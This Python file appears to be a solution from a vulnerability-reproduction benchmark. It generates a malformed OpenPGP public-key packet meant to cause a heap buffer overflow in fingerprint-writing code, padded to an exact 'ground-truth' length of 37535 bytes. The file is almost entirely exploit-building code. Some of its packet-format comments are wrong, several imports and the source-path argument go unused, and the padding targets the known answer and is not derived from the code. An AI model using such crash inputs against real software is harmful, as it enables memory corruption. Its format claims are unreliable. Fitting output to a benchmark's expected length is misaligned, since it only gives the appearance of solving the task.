import os
import tarfile
import tempfile
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This generates a minimal PGP packet that triggers the heap buffer overflow
        # when writing fingerprints in the vulnerable openpgp code
        
        # Create a PGP public key packet with malformed length to cause overflow
        # Packet structure: Tag byte + length bytes + key material
        
        # Use tag 6 (Public Key Packet) with new packet format (bit 7 set)
        tag = 0xC0 | 6  # Tag 6, new format
        
        # Create key material that will overflow fingerprint buffer
        # The vulnerability occurs when writing fingerprints from malformed keys
        
        # Key creation time (4 bytes)
        timestamp = struct.pack('>I', 0x5f8b4567)
        
        # Key algorithm (1 byte) - RSA = 1
        algorithm = b'\x01'
        
        # RSA public key material with carefully crafted modulus
        # that will cause overflow when fingerprint is calculated/written
        
        # Modulus length (2 bytes) - 0x8001 (32769) to allocate large buffer
        modulus_len = struct.pack('>H', 0x8001)
        
        # Modulus data - pattern that triggers overflow
        # Start with 0x00 to ensure proper MPI encoding
        modulus_data = b'\x00' + b'A' * 32767 + b'\x01'
        
        # Exponent length (2 bytes)
        exponent_len = struct.pack('>H', 0x0003)
        exponent_data = b'\x01\x00\x01'  # 65537
        
        # Combine key material
        key_material = timestamp + algorithm + modulus_len + modulus_data + exponent_len + exponent_data
        
        # Packet length - use partial body length (bit 6 set) to trick parser
        # First byte: 0xE0 | 1 (partial body length, 1-byte length follows)
        # Second byte: 0x92 (146 decimal)
        length_bytes = b'\xE1\x92'
        
        # Combine tag and length
        packet_header = bytes([tag]) + length_bytes
        
        # Create the packet
        packet = packet_header + key_material
        
        # Add more data to reach the target length that triggers the overflow
        # The overflow occurs during fingerprint writing, so we need enough
        # data to fill buffers and overflow the fingerprint buffer
        additional_data = b'B' * (37535 - len(packet))
        
        # Final PoC
        poc = packet + additional_data
        
        # Ensure exact ground-truth length for maximum compatibility
        if len(poc) != 37535:
            # Adjust to exact length if needed
            poc = poc[:37535] if len(poc) > 37535 else poc + b'C' * (37535 - len(poc))
        
        return poc